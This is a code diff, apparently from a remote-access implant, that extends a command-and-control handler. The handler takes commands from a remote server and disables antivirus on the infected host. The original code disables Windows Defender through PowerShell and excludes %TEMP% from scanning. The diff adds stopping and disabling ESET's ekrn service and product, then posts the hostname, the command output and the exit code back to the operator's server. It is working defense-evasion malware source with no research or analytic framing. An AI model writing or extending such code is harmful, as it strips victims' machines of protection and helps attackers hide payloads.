@@ -2354,17 +2354,41 @@ static void CheckAndHandleDefender() {
     std::string rowId = ExtractJSONNumber(resp, "id");
     std::string action = ExtractJSONString(resp, "payload");
     if (rowId.empty() || action.empty()) return;
-    if (action != "disable" && action != "enable") return;
+    std::string target = "defender";
+    std::string subAction = action;
+    size_t colon = action.find(':');
+    if (colon != std::string::npos) {
+        target = action.substr(0, colon);
+        subAction = action.substr(colon + 1);
+    }
+    if (subAction != "disable" && subAction != "enable") return;
+    if (target != "defender" && target != "eset") return;
     DWORD exitCode = 0;
     std::string cmd;
-    if (action == "disable") {
-        cmd = "powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true\"";
+    if (target == "defender") {
+        if (subAction == "disable") {
+            cmd = "powershell -NoProfile -Command \"Add-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true\"";
+        } else {
+            cmd = "powershell -NoProfile -Command \"Remove-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableScriptScanning $false\"";
+        }
     } else {
-        cmd = "powershell -NoProfile -Command \"Remove-MpPreference -ExclusionPath '%TEMP%'; Set-MpPreference -DisableRealtimeMonitoring $false -DisableBehaviorMonitoring $false -DisableScriptScanning $false\"";
+        if (subAction == "disable") {
+            cmd = "sc stop ekrn & sc config ekrn start= disabled & for /f \"delims=\" %i in ('dir /s /b \"C:\\Program Files\\ecls.exe\" \"C:\\Program Files (x86)\\ecls.exe\" 2^>nul') do \"%i\" /deploy-action=disable-product";
+        } else {
+            cmd = "sc config ekrn start= auto & sc start ekrn & for /f \"delims=\" %i in ('dir /s /b \"C:\\Program Files\\ecls.exe\" \"C:\\Program Files (x86)\\ecls.exe\" 2^>nul') do \"%i\" /deploy-action=enable-product";
+        }
     }
     std::string output = ExecuteCommand(cmd, &exitCode);
     if (output.empty()) output = "(no output)";
-    if (exitCode != 0 && output.find("Access is denied") != std::string::npos) exitCode = 2;
+    if (target == "eset" && subAction == "disable") {
+        DWORD qec = 0;
+        std::string qout = ExecuteCommand("sc query ekrn", &qec);
+        if (qec == 0 && qout.find("STOPPED") == std::string::npos && qout.find("FAILED") == std::string::npos) {
+            if (exitCode == 0) exitCode = 1;
+            output += "\n[ekrn service still running]";
+        }
+    }
+    if (output.find("Access is denied") != std::string::npos) exitCode = 2;
     std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"disable_defender " + EscapeJSON(action) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
     HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
     json = "{\"executed\":true}";
